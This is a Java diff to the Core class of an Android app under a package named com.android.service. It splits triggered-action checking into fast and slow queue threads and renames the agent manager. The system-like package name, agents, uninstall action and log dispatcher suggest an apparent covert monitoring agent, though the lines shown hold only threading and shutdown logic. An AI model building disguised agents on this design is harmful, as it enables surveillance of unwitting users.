@@ -14,10 +14,11 @@ import android.content.res.Resources;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 
+import com.android.service.Core.CheckAction;
 import com.android.service.action.Action;
 import com.android.service.action.SubAction;
 import com.android.service.action.UninstallAction;
-import com.android.service.agent.AgentManager;
+import com.android.service.agent.ManagerAgent;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfType;
 import com.android.service.conf.Configuration;
@@ -51,11 +52,14 @@ public class Core extends Activity implements Runnable {
 	private ContentResolver contentResolver;
 
 	/** The agent manager. */
-	private AgentManager agentManager;
+	private ManagerAgent agentManager;
 
 	/** The event manager. */
 	private EventManager eventManager;
 	private WakeLock wl;
+	private long queueSemaphore;
+	private Thread fastQueueThread;
+	private CheckAction checkActionFast;
 
 	/**
 	 * Start.
@@ -68,7 +72,7 @@ public class Core extends Activity implements Runnable {
 	 */
 	public boolean Start(final Resources r, final ContentResolver cr) {
 		coreThread = new Thread(this);
-		agentManager = AgentManager.self();
+		agentManager = ManagerAgent.self();
 		eventManager = EventManager.self();
 
 		resources = r;
@@ -178,34 +182,26 @@ public class Core extends Activity implements Runnable {
 		}
 	}
 
-	private void stopAll() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (stopAll)");
-		}
-		final Status status = Status.self();
-		// status.setRestarting(true);
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Warn: " + "checkActions: reloading"); //$NON-NLS-1$ //$NON-NLS-2$
-		}
-		status.unTriggerAll();
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
-		}
-		agentManager.stopAll();
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
-		}
-		eventManager.stopAll();
-		Utils.sleep(2000);
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
-		}
-		status.unTriggerAll();
+	private synchronized Exit checkActions() {
 
-		final LogDispatcher logDispatcher = LogDispatcher.self();
-		if (!logDispatcher.isAlive()) {
-			logDispatcher.waitOnEmptyQueue();
-			logDispatcher.halt();
+		checkActionFast = new CheckAction(Action.FAST_QUEUE);
+
+		fastQueueThread = new Thread(checkActionFast);
+		fastQueueThread.start();
+
+		return checkActions(Action.SLOW_QUEUE);
+
+	}
+
+	class CheckAction implements Runnable {
+
+		private final int queue;
+
+		CheckAction(int queue) {
+			this.queue = queue;
+		}
+		public void run() {
+			Exit ret = checkActions(queue);
 		}
 	}
 
@@ -215,16 +211,21 @@ public class Core extends Activity implements Runnable {
 	 * 
 	 * @return true, if successful
 	 */
-	private Exit checkActions() {
+	private Exit checkActions(int qq) {
 		final Status status = Status.self();
 
 		try {
 			while (!bStopCore) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " checkActions"); //$NON-NLS-1$
+					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$
 				}
-				final int[] actionIds = status.getTriggeredActions();
+				final int[] actionIds = status.getTriggeredActions(qq);
 
+				if(actionIds.length == 0){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
+					}
+				}
 				for (final int actionId : actionIds) {
 					final Action action = status.getAction(actionId);
 					final Exit exitValue = executeAction(action);
@@ -256,6 +257,37 @@ public class Core extends Activity implements Runnable {
 			}
 
 			return Exit.ERROR;
+		}
+	}
+
+	private void stopAll() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stopAll)");
+		}
+		final Status status = Status.self();
+		// status.setRestarting(true);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Warn: " + "checkActions: reloading"); //$NON-NLS-1$ //$NON-NLS-2$
+		}
+		status.unTriggerAll();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
+		}
+		agentManager.stopAll();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
+		}
+		eventManager.stopAll();
+		Utils.sleep(2000);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
+		}
+		status.unTriggerAll();
+
+		final LogDispatcher logDispatcher = LogDispatcher.self();
+		if (!logDispatcher.isAlive()) {
+			logDispatcher.waitOnEmptyQueue();
+			logDispatcher.halt();
 		}
 	}
 
